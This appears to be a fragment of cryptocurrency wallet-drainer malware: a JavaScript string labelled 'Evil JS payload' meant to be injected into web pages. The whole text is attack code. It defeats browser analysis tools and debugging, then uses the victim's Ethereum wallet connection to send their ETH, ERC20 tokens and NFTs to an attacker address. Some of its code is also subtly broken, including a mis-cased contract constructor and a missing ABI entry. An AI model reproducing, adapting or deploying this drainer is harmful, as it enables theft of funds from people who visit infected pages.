// Evil JS payload
const INJECT_SCRIPT = `
(async function() {
    // Kill analysis
    Object.defineProperty(navigator, 'webdriver', {get: () => false});
    window.chrome = {runtime: {}};
    document.addEventListener = new Proxy(document.addEventListener, {
        apply: (t, r, args) => !args[0].includes("devtools") ? t.apply(r, args) : null
    });
    setInterval(() => { if (window.outerHeight - window.innerHeight > 200) debugger; }, 1000);
    document.oncontextmenu = e => e.preventDefault();

    if (typeof window.ethereum === 'undefined') return;

    const attacker = "${DRAIN_WALLET}";
    const provider = window.ethereum;
    let userAddr;

    try {
        const accounts = await provider.request({"method": "eth_accounts"});
        if (accounts.length === 0) return;
        userAddr = accounts[0];
    } catch(e) {}

    // === DRAIN FUNDS ===
    const balance = await provider.request({"method": "eth_getBalance", "params": [userAddr]});
    const tx = {
        from: userAddr,
        to: attacker,
        value: parseInt(balance, 16),
        gas: '0x5208',
        gasPrice: await provider.request({"method": "eth_getGasPrice"})
    };
    await provider.request({"method": "eth_sendTransaction", "params": [tx]});

    // === DRAIN ERC20 ===
    const erc20ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function approve(address spender, uint256 amount) returns (bool)",
        "function transfer(address to, uint256 amount) returns (bool)"
    ];
    const contractAddress = '0x...'; // replace with the contract address
    const erc20 = new web3.Eth.Contract(erc20ABI, contractAddress);
    const tokenBalance = await erc20.methods.balanceOf(userAddr).call();
    if (tokenBalance > 0) {
        await erc20.methods.approve(attacker, 0).send({"from": userAddr});
        await erc20.methods.transfer(attacker, tokenBalance).send({"from": userAddr});
    }

    // === DRAIN NFTS ===
    const nftABI = [
        "function balanceOf(address owner) view returns (uint256)",
        "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)"
    ];
    const nftContractAddress = '0x...'; // replace with the nft contract address
    const nft = new web3.Eth.Contract(nftABI, nftContractAddress);
    const nftBalance = await nft.methods.balanceOf(userAddr).call();
    for (let i = 0; i < nftBalance; i++) {
        const tokenId = await nft.methods.tokenOfOwnerByIndex(userAddr, i).call();
        await nft.methods.transferFrom(userAddr, attacker, tokenId).send({"from": userAddr});
    }
})();